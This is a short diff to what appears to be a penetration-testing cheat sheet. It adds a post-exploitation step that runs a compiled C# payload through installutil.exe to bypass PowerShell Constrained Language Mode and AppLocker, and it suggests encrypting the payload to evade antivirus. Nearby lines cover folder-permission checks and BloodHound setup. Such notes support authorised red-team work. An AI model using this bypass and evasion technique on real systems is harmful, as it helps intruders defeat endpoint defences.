@@ -56,6 +56,13 @@ icacls C:\Windows\Tasks
 > Find a folder that you have the RX permission.
 ```
 
+# Post Exploitation - Bypass CLM and AppLocker:
+```
+> Compile Bypass_CLM_And_AppLocker_Dynamically.cs and get the exe. Upload the exe to the machine. Maybe you should encrypt for Antivirus Evasion.
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U bu.exe
+> Run with suitable installutil.exe to bypass.
+```
+
 # Bloodhound - Init
 ```
 neo4j console
